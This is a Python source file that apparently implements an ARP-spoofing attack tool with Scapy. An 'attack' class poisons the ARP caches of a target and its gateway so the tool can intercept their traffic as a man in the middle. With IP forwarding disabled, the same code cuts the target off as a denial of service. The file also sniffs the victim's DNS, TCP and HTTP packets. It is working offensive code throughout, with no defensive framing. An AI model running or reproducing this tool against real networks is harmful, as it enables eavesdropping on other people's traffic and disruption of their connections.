import os
from scapy.all import *
import socket
class error(Exception):
	pass
class attack:
	def __init__(self,target_ip,getaway_ip,interface,packets_to_dump=0):
		self.target_ip = target_ip
		self.getaway_ip = getaway_ip
		self.interface = interface
		self.packets_to_dump = packets_to_dump
	def base_of_mitm_and_dos(self,choise,target_mac,getaway_mac):
		self.choise = choise
		self.target_mac = target_mac
		self.getaway_mac = getaway_mac
		if choise == True:
			os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
		elif choise == False:
			os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")
		elif choise == None:
			raise ValueError("Choose must either be True or False .")
			exit()
		try :
			while 1:
				send(ARP(op = 2,pdst=self.target_ip,psrc=self.getaway_ip,hwdst = self.target_mac),verbose=0)
				send(ARP(op = 2,pdst=self.getaway_ip,psrc=self.target_ip,hwdst = self.getaway_mac),verbose=0)
		except :
			self.clean_up()
	def get_target_mac_adress(self):
		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target_ip),timeout=2, iface = self.interface,inter=0.1,verbose=0)
		try :
			self.target_mac_adress = ans[0][1].hwsrc
			return self.target_mac_adress
		except :
			raise error("[RESPONSE ERROR] : Target not sersponding to our arp requests (make sure the ip is right and the host is connected).")
	def get_getaway_mac_address(self):
		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst=self.getaway_ip),timeout=2, iface = self.interface,inter=0.1,verbose=0)
		try :
			self.getaway_mac_address = ans[0][1].hwsrc
			return self.getaway_mac_address
		except :
			raise error("[RESPONSE ERROR] : Getaway not sersponding to our arp requests (Run 'route -n' to see the real getaway).")
	def clean_up(self):
		print("Cleaning up ...")
		for clean in range(10):
			send(ARP(op = 2,pdst=self.target_ip,psrc=self.target_ip,hwdst = self.target_mac),verbose=0)
			send(ARP(op = 2,pdst=self.getaway_ip,psrc=self.getaway_ip,hwdst = self.getaway_mac),verbose=0)
	def mitm(self):
		t = self.get_target_mac_adress()
		g = self.get_getaway_mac_address()
		self.base_of_mitm_and_dos(1,t,g)
	def dos(self):
		t = self.get_target_mac_adress()
		g = self.get_getaway_mac_address()
		self.base_of_mitm_and_dos(0,t,g)
	def dns_dump(self):
		if int(self.packets_to_dump) == 0:
			while 1:
				self.dns_pk = sniff(filter = 'port 53', count = 1)
				self.dns_pk.summary()
		else :
			for times in range(int(self.packets_to_dump)):
				self.dns_pk = sniff(filter = 'port 53', count = 1)
				self.dns_pk.summary()
	def tcp_dump(self):
		if int(self.packets_to_dump) == 0:
			while 1:
				self.tcp_pk = sniff(filter = 'tcp', count = 1)
				self.tcp_pk.summary()
		else :
			for times in range(int(self.packets_to_dump)):
				self.tcp_pk = sniff(filter = 'tcp', count = 1)
				self.tcp_pk.summary()
	def http_dump(self):
		if int(self.packets_to_dump) == 0:
                        while 1:
                                self.http_pk = sniff(filter = 'port 80', count = 1)
                                self.http_pk.summary()
                else :
                        for times in range(int(self.packets_to_dump)):
                                self.http_pk = sniff(filter = 'port 80', count = 1)
                                self.http_pk.summary()
